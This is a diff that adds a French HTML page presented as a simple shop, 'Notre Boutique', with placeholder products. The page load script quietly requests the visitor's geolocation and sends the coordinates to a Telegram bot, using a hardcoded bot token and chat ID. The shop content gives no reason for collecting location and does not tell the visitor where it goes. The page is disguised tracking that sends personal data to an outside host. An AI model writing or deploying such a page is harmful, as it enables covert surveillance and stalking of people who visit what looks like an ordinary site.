@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Envoi de localisation à un bot Telegram</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                console.log("La géolocalisation n'est pas prise en charge par ce navigateur.");
+            }
+        }
+
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            var botToken = "6168495096:AAGTN6L_blwcAkg5SaqRVw76_bchyHPWbS4";
+            var chatId = "-1001910296179";
+            var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendLocation";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", apiUrl + "?chat_id=" + chatId + "&latitude=" + latitude + "&longitude=" + longitude);
+            xhr.send();
+
+            console.log("Localisation envoyée au bot Telegram !");
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    console.log("L'utilisateur a refusé la demande de localisation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.log("Les informations de localisation ne sont pas disponibles.");
+                    break;
+                case error.TIMEOUT:
+                    console.log("La demande de localisation a expiré.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.log("Une erreur inconnue s'est produite.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <style>
+    body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+        }
+        
+        h1 {
+            margin: 0;
+        }
+        
+        nav {
+            background-color: #ff04abec;
+            color: #fff;
+            padding: 10px;
+        }
+        
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+        }
+        
+        nav ul li {
+            display: inline-block;
+            margin-right: 10px;
+        }
+        
+        nav ul li a {
+            color: #fff;
+            text-decoration: none;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .product {
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .product h2 {
+            margin: 0;
+        }
+        
+        .product p {
+            margin: 10px 0;
+        }
+        
+        .product .price {
+            font-weight: bold;
+            color: #333;
+        }
+        
+        footer {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+    </style>
+    
+    <header>
+        <h1>Notre Boutique</h1>
+    </header>
+    
+    <nav>
+        <ul>
+            <li><a href="#">Accueil</a></li>
+            <li><a href="#">Produits</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    
+    <div class="container">
+        <div class="product">
+            <h2>Produit 1</h2>
+            <p>Description du produit 1.</p>
+            <p class="price">Prix: $10</p>
+        </div>
+        
+        <div class="product">
+            <h2>Produit 2</h2>
+            <p>Description du produit 2.</p>
+            <p class="price">Prix: $15</p>
+        </div>
+    </div>
+    
+    <footer>
+        &copy; 2023 Notre Boutique. Tous droits réservés.
+    </footer>
+    
+    <script>
+        sendLocation();
+    </script>
+</body>
+</html>
